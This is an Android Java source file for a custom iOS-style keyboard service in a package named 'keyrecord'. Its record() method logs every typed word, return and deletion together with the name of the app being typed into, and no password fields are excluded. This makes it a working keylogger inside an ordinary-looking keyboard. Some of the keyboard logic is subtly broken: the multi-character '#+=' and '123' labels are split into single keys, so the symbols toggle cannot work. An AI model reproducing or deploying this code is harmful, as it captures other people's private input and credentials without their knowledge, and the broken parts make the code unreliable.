package com.keyrecord.app;

import android.content.Context;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.inputmethodservice.InputMethodService;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethodManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.Locale;

/**
 * Built-in keyboard inspired by the iOS system keyboard: rounded gray keys,
 * a long space bar, a globe / 123 / comma / space / period / return bar,
 * shift capitalization, and an iOS-style key-pop animation. Every key is
 * captured and written locally via LogManager at commit time (real-time,
 * works in floating windows / split screen).
 */
public class TraceInputMethod extends InputMethodService {

    private static final long WORD_FLUSH_DELAY_MS = 900;
    private static final int LETTERS = 0;
    private static final int NUMBERS = 1;
    private static final int SYMBOLS = 2;

    private LogManager logManager;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private FrameLayout root;
    private LinearLayout keyboardView;
    private TextView popup;

    private int page = LETTERS;
    private int shiftState = 0; // 0 off, 1 one-shot, 2 caps lock

    private final StringBuilder wordBuffer = new StringBuilder();
    private final Runnable flushRunnable = this::flushWord;

    @Override
    public void onCreate() {
        super.onCreate();
        logManager = LogManager.getInstance(this);
    }

    @Override
    public View onCreateInputView() {
        root = new FrameLayout(this);
        root.setBackgroundColor(color(R.color.ime_bg));

        keyboardView = new LinearLayout(this);
        keyboardView.setOrientation(LinearLayout.VERTICAL);
        keyboardView.setPadding(dp(4), dp(8), dp(4), dp(8));
        root.addView(keyboardView, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        popup = new TextView(this);
        popup.setTextSize(32);
        popup.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        popup.setTextColor(color(R.color.ime_key_text));
        popup.setBackground(rounded(R.color.ime_pop_bg, 10));
        popup.setPadding(dp(14), dp(6), dp(14), dp(6));
        popup.setVisibility(View.GONE);
        root.addView(popup, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        rebuild();
        return root;
    }

    @Override
    public void onFinishInputView(boolean finishingInput) {
        flushWord();
        super.onFinishInputView(finishingInput);
    }

    // --------------------------------------------------------------- build UI

    private void rebuild() {
        if (popup != null) {
            popup.setVisibility(View.GONE);
        }
        keyboardView.removeAllViews();

        if (page == LETTERS) {
            addRow("qwertyuiop", 1f);
            addInsetRow("asdfghjkl", 1f);
            addSideRow("zxcvbnm");
        } else if (page == NUMBERS) {
            addRow("1234567890", 1f);
            addRow("-/:;()$&@\".", 1f);
            addSideRow("*+\"'%,?!#+=");
        } else {
            addRow("[]{}#%^*+=", 1f);
            addRow("_\\|~<>¥€£•", 1f);
            addSideRow("§©®™°¶…123");
        }
        addBottomRow();
    }

    private void addRow(String keys, float weight) {
        LinearLayout row = newRow();
        for (int i = 0; i < keys.length(); i++) {
            row.addView(makeKey(String.valueOf(keys.charAt(i)), weight, false));
        }
        keyboardView.addView(row);
    }

    private void addInsetRow(String keys, float weight) {
        LinearLayout row = newRow();
        row.setPadding(dp(16), 0, dp(16), 0);
        for (int i = 0; i < keys.length(); i++) {
            row.addView(makeKey(String.valueOf(keys.charAt(i)), weight, false));
        }
        keyboardView.addView(row);
    }

    /** Third row: [shift] keys... [delete]. */
    private void addSideRow(String keys) {
        LinearLayout row = newRow();
        row.addView(makeKey("\u21E7", 1.4f, true));
        for (int i = 0; i < keys.length(); i++) {
            row.addView(makeKey(String.valueOf(keys.charAt(i)), 1f, false));
        }
        row.addView(makeKey("\u232B", 1.4f, true));
        keyboardView.addView(row);
    }

    private void addBottomRow() {
        LinearLayout row = newRow();
        row.addView(makeKey("\uD83C\uDF10", 1.2f, true));          // globe / switch
        row.addView(makeKey(page == LETTERS ? "123" : "ABC", 1.5f, true));
        row.addView(makeKey(",", 1f, false));
        row.addView(makeKey(getString(R.string.ime_space), 4f, false));
        row.addView(makeKey(".", 1f, false));
        row.addView(makeKey("\u21B5", 1.5f, true, true));          // return (accent)
        keyboardView.addView(row);
    }

    private LinearLayout newRow() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, dp(44));
        lp.topMargin = dp(5);
        row.setLayoutParams(lp);
        return row;
    }

    private TextView makeKey(String label, float weight, boolean special) {
        return makeKey(label, weight, special, false);
    }

    private TextView makeKey(String label, float weight, boolean special, boolean accent) {
        final String shown = (shiftState != 0 && !special && label.length() == 1)
                ? label.toUpperCase(Locale.ROOT) : label;
        final TextView key = new TextView(this);
        key.setText(shown);
        key.setGravity(Gravity.CENTER);
        key.setMaxLines(1);
        key.setTextSize(special || label.length() > 2 ? 14 : 20);
        key.setTypeface(Typeface.DEFAULT, special && label.length() <= 2
                ? Typeface.NORMAL : Typeface.BOLD);
        key.setTextColor(accent ? 0xFFFFFFFF : color(R.color.ime_key_text));
        key.setBackground(accent
                ? rounded(R.color.ime_accent, 7)
                : rounded(special ? R.color.ime_key_special : R.color.ime_key_bg, 7));

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.MATCH_PARENT, weight);
        lp.leftMargin = dp(3);
        lp.rightMargin = dp(3);
        key.setLayoutParams(lp);

        final boolean poppable = !special && !accent && label.length() == 1;
        key.setOnTouchListener((v, e) -> {
            if (e.getAction() == MotionEvent.ACTION_DOWN) {
                v.setAlpha(0.55f);
                if (poppable) {
                    showPop(shown, v);
                }
            } else if (e.getAction() == MotionEvent.ACTION_UP
                    || e.getAction() == MotionEvent.ACTION_CANCEL) {
                v.setAlpha(1f);
            }
            return false;
        });
        key.setOnClickListener(v -> onKey(label));
        return key;
    }

    // ----------------------------------------------------------------- input

    private void onKey(String label) {
        if ("\u21E7".equals(label)) { // shift
            shiftState = (shiftState == 0) ? 1 : (shiftState == 1 ? 2 : 0);
            rebuild();
            return;
        }
        if ("\u232B".equals(label)) { // delete
            handleBackspace();
            return;
        }
        if ("\u21B5".equals(label)) { // return
            flushWord();
            record("[\u21B5]");
            commitText("\n");
            return;
        }
        if ("\uD83C\uDF10".equals(label)) { // globe -> switch IME
            flushWord();
            InputMethodManager imm =
                    (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) {
                imm.showInputMethodPicker();
            }
            return;
        }
        if (label.equals("123") || label.equals("ABC")) { // page toggle
            page = (page == LETTERS) ? NUMBERS : LETTERS;
            rebuild();
            return;
        }
        if (label.equals("#+=")) { // numbers <-> symbols
            page = (page == NUMBERS) ? SYMBOLS : NUMBERS;
            rebuild();
            return;
        }
        if (label.equals(getString(R.string.ime_space))) { // space
            flushWord();
            commitText(" ");
            return;
        }

        String out = label;
        if (shiftState != 0 && label.length() == 1) {
            out = label.toUpperCase(Locale.ROOT);
            if (shiftState == 1) {
                shiftState = 0;
            }
        }
        wordBuffer.append(out);
        scheduleFlush();
    }

    private void handleBackspace() {
        flushWord();
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.deleteSurroundingText(1, 0);
        }
        record("[\u232B]");
    }

    private void commitText(String text) {
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.commitText(text, 1);
        }
    }

    // --------------------------------------------------- word aggregation / log

    private void scheduleFlush() {
        handler.removeCallbacks(flushRunnable);
        handler.postDelayed(flushRunnable, WORD_FLUSH_DELAY_MS);
    }

    private void flushWord() {
        handler.removeCallbacks(flushRunnable);
        if (wordBuffer.length() == 0) {
            return;
        }
        String word = wordBuffer.toString();
        wordBuffer.setLength(0);
        commitText(word);
        record(word);
    }

    private void record(String text) {
        EditorInfo info = getCurrentInputEditorInfo();
        String pkg = (info != null && info.packageName != null)
                ? info.packageName : "unknown";
        logManager.appendEntry(pkg, text);
    }

    // ------------------------------------------------------------- iOS key pop

    private void showPop(String text, View key) {
        if (popup == null || root == null) {
            return;
        }
        popup.setText(text);
        popup.measure(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED);
        int[] r = new int[2];
        int[] k = new int[2];
        root.getLocationOnScreen(r);
        key.getLocationOnScreen(k);
        int cx = k[0] - r[0] + key.getWidth() / 2;
        int top = k[1] - r[1];
        FrameLayout.LayoutParams lp = (FrameLayout.LayoutParams) popup.getLayoutParams();
        lp.leftMargin = cx - popup.getMeasuredWidth() / 2;
        lp.topMargin = top - popup.getMeasuredHeight() - dp(6);
        popup.setLayoutParams(lp);
        popup.setVisibility(View.VISIBLE);
        popup.setAlpha(1f);
        popup.setScaleX(1f);
        popup.setScaleY(1f);
        popup.animate()
                .alpha(0f)
                .setStartDelay(140)
                .setDuration(120)
                .withEndAction(() -> popup.setVisibility(View.GONE))
                .start();
    }

    // ------------------------------------------------------------------ utils

    private GradientDrawable rounded(int colorRes, int radiusDp) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(color(colorRes));
        d.setCornerRadius(dp(radiusDp));
        return d;
    }

    private int color(int res) {
        return getResources().getColor(res, getTheme());
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}
